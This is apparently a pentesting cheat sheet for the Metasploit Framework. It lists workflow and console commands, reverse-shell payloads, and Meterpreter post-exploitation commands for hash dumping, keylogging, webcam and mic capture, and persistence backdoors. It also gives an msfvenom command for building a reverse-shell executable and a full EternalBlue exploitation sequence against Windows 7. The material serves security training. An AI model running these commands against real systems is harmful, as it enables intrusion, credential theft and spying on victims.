# Metasploit Framework
Metasploit is a penetration testing framework that provides tools, exploits, and payloads to test vulnerabilities in systems. It's widely used by security professionals to:

- Identify weaknesses
- Exploit systems (with permission)
- Develop and test payloads
- Automate attacks using scripts (rc files)

### Key Components
| **Component**          | **Purpose**                                                        |
| ---------------------- | ------------------------------------------------------------------ |
| **Exploit**            | The code that takes advantage of a vulnerability                   |
| **Payload**            | Code that runs after successful exploitation (e.g., reverse shell) |
| **Encoder**            | Obfuscates payload to bypass AV                                    |
| **Auxiliary**          | Scanners, fuzzers, and tools (not for exploiting)                  |
| **Listener (Handler)** | Listens for payload connections (e.g., reverse shells)             |
| **Post**               | Modules to run after exploitation (dump hashes, escalate privs)    |


### Basic Workflow
1. Start Metasploit
```bash
msfconsole
```
2. Search Exploit
```bash
search name_or_service
```
3. Select Module
```bash
use exploit/path/to/module
```
4. Set Payload
```bash
set payload windows/meterpreter/reverse_tcp
```
5. Configure Options
```bash
set RHOSTS <target_ip>
set LHOST <your_ip>
```
6. Exploit the Target
```bash
exploit
```

### Common Module Paths
| Module Type       | Path                                       |
| ----------------- | ------------------------------------------ |
| Exploits          | `exploit/windows/smb/ms17_010_eternalblue` |
| Payloads          | `payload/windows/meterpreter/reverse_tcp`  |
| Auxiliaries       | `auxiliary/scanner/portscan/tcp`           |
| Post-Exploitation | `post/windows/gather/hashdump`             |

### Common Payloads
| Payload                             | Use                            |
| ----------------------------------- | ------------------------------ |
| `windows/meterpreter/reverse_tcp`   | Reverse shell with Meterpreter |
| `windows/shell/reverse_tcp`         | Simple reverse shell           |
| `linux/x86/meterpreter/reverse_tcp` | Linux Meterpreter shell        |
| `android/meterpreter/reverse_tcp`   | Android payload                |
| `cmd/unix/reverse`                  | Simple UNIX reverse shell      |

## Commands:

| **Command**             | **Description**                                   | **Example**                                     |
| ----------------------- | ------------------------------------------------- | ----------------------------------------------- |
| `msfconsole`            | Launch Metasploit Framework                       | `msfconsole`                                    |
| `search [term]`         | Search for exploit/module/payload                 | `search vsftpd`                                 |
| `use [module_path]`     | Use specific exploit or module                    | `use exploit/windows/smb/ms17_010_eternalblue`  |
| `info`                  | Show details of current module                    | `info`                                          |
| `show options`          | Show required settings for current module         | `show options`                                  |
| `set [OPTION] [value]`  | Set option value                                  | `set RHOSTS 192.168.1.10`                       |
| `setg [OPTION] [value]` | Set global option (works for all modules)         | `setg LHOST 192.168.1.5`                        |
| `show payloads`         | Show compatible payloads                          | `show payloads`                                 |
| `set payload [name]`    | Set a specific payload                            | `set payload linux/x86/meterpreter/reverse_tcp` |
| `show targets`          | Show target platforms/versions                    | `show targets`                                  |
| `exploit` or `run`      | Launch the exploit                                | `exploit`                                       |
| `back`                  | Return to previous module                         | `back`                                          |
| `jobs`                  | Show background tasks                             | `jobs`                                          |
| `kill [job_id]`         | Stop background task                              | `kill 1`                                        |
| `sessions`              | View active sessions                              | `sessions`                                      |
| `sessions -i [id]`      | Interact with a session                           | `sessions -i 1`                                 |
| `background`            | Background the current session                    | `background`                                    |
| `load [module]`         | Load extra functionality (e.g., `auto_add_route`) | `load mimikatz`                                 |
| `exit`                  | Exit Metasploit                                   | `exit`                                          |


### Post-Exploitation (Meterpreter)
| Command           | Use                                |
| ----------------- | ---------------------------------- |
| `sysinfo`         | Show system info                   |
| `getuid`          | Show current user                  |
| `hashdump`        | Dump password hashes               |
| `screenshot`      | Take screenshot of victim's screen |
| `record_mic`      | Record audio from victim mic       |
| `webcam_snap`     | Take picture via webcam            |
| `keyscan_start`   | Start keylogger                    |
| `keyscan_dump`    | Dump keystrokes                    |
| `shell`           | Drop into system shell             |
| `upload/download` | Transfer files                     |
| `persistence`     | Create backdoor to re-enter later  |

### Creating Malicious Files with msfvenom
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f exe > payload.exe
```
| Flag            | Description                                      |
| --------------- | ------------------------------------------------ |
| `-p`            | Payload type                                     |
| `LHOST`/`LPORT` | Your attacker machine details                    |
| `-f`            | Output format (`exe`, `apk`, `elf`, `raw`, etc.) |
| `-o`            | Output to file (optional)                        |

#### Practical Exploitation Example (Windows 7 EternalBlue)
```bash
msfconsole
search ms17_010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set LHOST 192.168.1.5
set payload windows/meterpreter/reverse_tcp
exploit
```
